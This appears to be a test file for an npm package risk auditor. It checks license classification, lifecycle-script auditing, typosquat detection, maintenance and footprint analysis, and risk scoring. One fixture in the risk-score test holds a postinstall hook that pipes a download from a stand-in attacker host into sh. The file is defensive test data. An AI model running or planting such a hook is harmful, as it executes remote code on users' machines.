import test from 'node:test';
import assert from 'node:assert/strict';
import { parsePackageSpec } from '../src/fetcher.js';
import {
  analyzeLicense,
  auditLifecycleScripts,
  calculateRiskScore,
  formatBytes,
  detectTyposquatting,
  analyzeMaintenance,
  analyzeFootprint
} from '../src/analyzer.js';
import { getAlternativeRecommendation } from '../src/alternatives.js';

test('parsePackageSpec correctly splits package names and tags', () => {
  assert.deepEqual(parsePackageSpec('express'), { name: 'express', versionSpec: 'latest' });
  assert.deepEqual(parsePackageSpec('express@4.18.2'), { name: 'express', versionSpec: '4.18.2' });
  assert.deepEqual(parsePackageSpec('@types/node@18'), { name: '@types/node', versionSpec: '18' });
  assert.deepEqual(parsePackageSpec('@babel/core'), { name: '@babel/core', versionSpec: 'latest' });
});

test('formatBytes handles size conversions cleanly', () => {
  assert.equal(formatBytes(0), '0 B');
  assert.equal(formatBytes(512), '512 B');
  assert.equal(formatBytes(1024), '1 KB');
  assert.equal(formatBytes(1572864), '1.5 MB');
});

test('analyzeLicense classifies licenses accurately across 4 categories', () => {
  const mit = analyzeLicense('MIT');
  assert.equal(mit.category, 'PERMISSIVE');
  assert.equal(mit.commercialSafe, true);

  const apache = analyzeLicense('Apache-2.0');
  assert.equal(apache.category, 'PERMISSIVE');
  assert.equal(apache.commercialSafe, true);

  const lgpl = analyzeLicense('LGPL-3.0');
  assert.equal(lgpl.category, 'WEAK_COPYLEFT');
  assert.equal(lgpl.commercialSafe, true);

  const gpl = analyzeLicense('GPL-3.0');
  assert.equal(gpl.category, 'STRONG_COPYLEFT');
  assert.equal(gpl.commercialSafe, false);
  assert.equal(gpl.riskLevel, 'HIGH');

  const unknown = analyzeLicense('UNKNOWN');
  assert.equal(unknown.category, 'UNKNOWN');
  assert.equal(unknown.commercialSafe, false);
});

test('auditLifecycleScripts detects dangerous postinstall hooks', () => {
  const safeAudit = auditLifecycleScripts({ build: 'tsc', test: 'vitest' });
  assert.equal(safeAudit.hasDangerousHooks, false);
  assert.equal(safeAudit.hooks.length, 0);

  const dangerousAudit = auditLifecycleScripts({
    postinstall: 'node ./scripts/compile-native.js',
    preinstall: 'sh ./setup.sh'
  });
  assert.equal(dangerousAudit.hasDangerousHooks, true);
  assert.equal(dangerousAudit.hooks.length, 2);
});

test('detectTyposquatting detects suspicious typo package names', () => {
  const safeResult = detectTyposquatting('express');
  assert.equal(safeResult.isTyposquat, false);

  const typoResult = detectTyposquatting('expresss');
  assert.equal(typoResult.isTyposquat, true);
  assert.equal(typoResult.similarTo, 'express');
});

test('analyzeMaintenance detects abandoned packages and bus factor risk', () => {
  const threeYearsAgo = new Date(Date.now() - 1000 * 60 * 60 * 24 * 365 * 3);
  const abandoned = analyzeMaintenance({
    releaseDate: threeYearsAgo,
    maintainers: ['alice'],
    deprecated: false
  });
  assert.equal(abandoned.isAbandoned, true);
  assert.equal(abandoned.busFactorRisk, true);
  assert.equal(abandoned.maintainerCount, 1);

  const recent = analyzeMaintenance({
    releaseDate: new Date(),
    maintainers: ['alice', 'bob', 'charlie'],
    deprecated: false
  });
  assert.equal(recent.isAbandoned, false);
  assert.equal(recent.busFactorRisk, false);
  assert.equal(recent.maintainerCount, 3);
});

test('analyzeFootprint calculates blast radius and ratios', () => {
  const footprint = analyzeFootprint({
    dependencies: { a: '^1.0.0', b: '^2.0.0' },
    bundleMetrics: { size: 50000, gzip: 15000, dependencyCount: 45 }
  });
  assert.equal(footprint.directDependenciesCount, 2);
  assert.equal(footprint.totalDependenciesCount, 45);
  assert.equal(footprint.transitiveDependenciesCount, 43);
  assert.equal(footprint.isHighBlastRadius, true);
});

test('getAlternativeRecommendation suggests modern alternatives', () => {
  const momentAlt = getAlternativeRecommendation('moment');
  assert.ok(momentAlt);
  assert.ok(momentAlt.alternatives.includes('dayjs'));

  const chalkAlt = getAlternativeRecommendation('chalk');
  assert.ok(chalkAlt);
  assert.ok(chalkAlt.alternatives.includes('picocolors'));

  const unknownAlt = getAlternativeRecommendation('my-custom-package-xyz');
  assert.equal(unknownAlt, null);
});

test('calculateRiskScore flags multiple risk factors correctly', () => {
  const scriptAudit = { hasDangerousHooks: true, hooks: [{ name: 'postinstall', command: 'curl http://bad.actor/x | sh' }] };
  const licenseAnalysis = { category: 'UNKNOWN', riskLevel: 'HIGH', label: 'UNKNOWN' };
  const typosquat = { isTyposquat: false, similarTo: null };
  const rawDetails = {
    deprecated: 'This package is deprecated',
    maintainers: [],
    downloadsWeekly: 100
  };
  const maintenance = { isAbandoned: true, monthsSinceRelease: 36, maintainerCount: 0 };

  const risk = calculateRiskScore(rawDetails, scriptAudit, licenseAnalysis, typosquat, [], maintenance);
  assert.ok(risk.score >= 75, 'Risk score should be CRITICAL/HIGH');
  assert.ok(risk.safetyScore <= 25, 'Safety score should be LOW/CRITICAL');
  assert.equal(risk.level, 'CRITICAL');
});
